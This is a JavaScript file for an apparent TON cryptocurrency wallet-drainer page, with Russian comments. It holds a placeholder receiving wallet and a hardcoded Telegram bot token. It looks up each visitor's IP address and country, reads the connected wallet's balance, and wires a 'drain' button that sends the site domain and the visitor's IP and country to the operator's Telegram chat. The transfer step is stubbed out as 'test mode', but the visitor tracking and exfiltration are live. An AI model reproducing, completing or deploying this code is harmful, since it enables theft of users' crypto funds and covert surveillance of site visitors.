var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Ваш кошелёк (замените)
var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg";
var tgChat = "-1001234567890";

var domain = window.location.hostname;
var ipUser = '';
var countryUser = '';


fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        ipUser = data.ip || 'unknown';
        countryUser = data.country || 'unknown';
        console.log('IP:', ipUser, 'Country:', countryUser);
    })
    .catch(e => console.error('IP error:', e));


function sendTelegram(message) {
    if (!tgBotToken || !tgChat) return;
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: tgChat, text: message, parse_mode: 'Markdown' })
    }).catch(e => console.error('Telegram send error:', e));
}


const protocol = window.location.protocol;
const manifestUrl = protocol + '//' + domain + '/tonconnect-manifest.json';
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect'
});

const balanceSpan = document.getElementById('balanceValue');
const drainBtn = document.getElementById('drainBtn');


async function updateBalance(address) {
    try {
        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
        const data = await resp.json();
        if (data.ok) {
            const balance = parseInt(data.result) / 1e9;
            balanceSpan.textContent = balance.toFixed(4);
        } else {
            balanceSpan.textContent = 'Ошибка';
        }
    } catch (e) {
        console.error('Balance error:', e);
        balanceSpan.textContent = 'Ошибка';
    }
}


tonConnectUI.on('walletConnected', (walletInfo) => {
    console.log('Wallet connected:', walletInfo);
    drainBtn.disabled = false;
    const address = tonConnectUI.account?.address;
    if (address) {
        updateBalance(address);
    }
});

tonConnectUI.on('walletDisconnected', () => {
    drainBtn.disabled = true;
    balanceSpan.textContent = '—';
});


drainBtn.addEventListener('click', function() {
    alert('Функция временно недоступна. Это тестовый режим.');
    
    sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n🔒 *Нажал кнопку, но транзакция отключена*`);
});
